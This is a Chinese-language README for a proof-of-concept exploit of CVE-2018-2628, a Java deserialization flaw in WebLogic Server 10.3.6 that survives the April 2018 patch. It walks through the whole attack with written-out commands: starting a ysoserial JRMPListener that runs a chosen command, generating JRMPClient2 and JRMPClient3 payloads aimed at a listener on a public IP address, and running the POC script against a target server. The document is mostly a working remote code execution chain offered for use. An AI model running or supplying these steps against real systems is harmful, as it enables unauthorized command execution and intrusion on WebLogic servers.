# ysoserial-cve-2018-2628 
### 0x1. 准备工作  
- **准备好POC脚本及Payload Object生成、JRMPListener运行所需软件环境**  
Python 2.7.x  
Oracle Java SE 1.7+ 
- **准备好一套安装好Patch Set Update 180417补丁的WebLogic Server 10.3.6环境（仅有AdminServer即可）**  
如果有现成的、已经安装好这个PSU版本的WebLogic环境，则可跳过这一步。
- **准备好POC工具**  
从本项目里下载POC脚本（wls-cve-2018-2628-poc.py）  
从本项目[**release**](https://github.com/tdy218/ysoserial-cve-2018-2628/releases)页面下载Payload Object生成、JRMPListener程序的jar包文件（ysoserial-\<version\>-cve-2018-2628-all.jar）

### 0x2. 运行JRMPListener  
命令格式:    
> java -cp ysoserial-\<version\>-cve-2018-2628-all.jar ysoserial.exploit.JRMPListener \<listen port\> \<gadget class\> \<command\>  

例如:   
> java -cp ysoserial-0.1-cve-2018-2628-all.jar ysoserial.exploit.JRMPListener 22801 Jdk7u21 "calc.exe"  

当看到 ***Opening JRMP listener on 22801** 输出时, 记录JRMPListener所在主机的IP地址（示例为运行在一台公网IP为47.94.158.125的阿里云ECS主机上）和指定的端口。

### 0x3. 根据上一步JRMPListener所在主机的IP地址和监听端口信息, 生成Payload字符串  
目前已知两种方法（生成Payload Object String时，下面两种方法二选一即可）:   
- **利用java.rmi.activation.Activator\[CVE-2017-3248\]**

生成Payload Object String命令格式:  
> java -jar ysoserial-\<version\>-cve-2018-2628-all.jar JRMPClient2 \<JRMPListener IP\>:\<JRMPListener Port\> | xxd -p | tr -d $'\n' && echo    

例如:    
> java -jar ysoserial-0.1-cve-2018-2628-all.jar JRMPClient2 47.94.158.125:22801 | xxd -p | tr -d $'\n' && echo   

样例（用JRMPClient2生成的Payload对象二进制输出数据）:  
![](https://raw.githubusercontent.com/tdy218/public-resources/master/img/JRMPClient2_XXD.png)
- **利用weblogic.jms.common.StreamMessageImpl封装java.rmi.registry.Registry** 

生成Payload Object String命令格式:  
> java -jar ysoserial-\<version\>-cve-2018-2628-all.jar JRMPClient3 \<JRMPListener IP\>:\<JRMPListener Port\> | xxd -p | tr -d $'\n' && echo

例如:   
> java -jar ysoserial-0.1-cve-2018-2628-all.jar JRMPClient3 47.94.158.125:22801 | xxd -p | tr -d $'\n' && echo  

样例（用JRMPClient3生成的Payload对象二进制输出数据）: 
![](https://raw.githubusercontent.com/tdy218/public-resources/master/img/JRMPClient3_XXD.png)

### 0x4. 编辑并运行POC脚本  
编辑wls-cve-2018-2628-poc.py, 用上一步生成的hex字符串替换脚本顶部名为payload_str变量的变量值(此脚本中自带的两个payload_str变量的变量值都可以直接利用, 分别对应上面两种方法生成的hex string).

命令格式:  
> python wls-cve-2018-2628-poc.py <目标WebLogic Server实例监听IP> <目标WebLogic Server实例监听端口>   

例如:  
> python wls-cve-2018-2628-poc.py 192.168.64.83 7001  

样例（已安装了Patch Set Update 180417）:  
![](https://raw.githubusercontent.com/tdy218/public-resources/master/img/weblogic-version-applied-psu.png)  
![](https://raw.githubusercontent.com/tdy218/public-resources/master/img/weblogic-version-applied-psu-poc.png)

### 0x5. 鸣谢  
xxlegend@nsfocus（CVE-2018-2628的漏洞发现和提交者之一，揭示漏洞利用方式及相关代码示例）    
badcode@knownsec（提供weblogic.jms.common.StreamMessageImpl封装java.rmi.registry.Registry的代码示例）   
[ysoserial project](https://github.com/brianwrf/ysoserial)（汇总了许多Java反序列化利用程序）
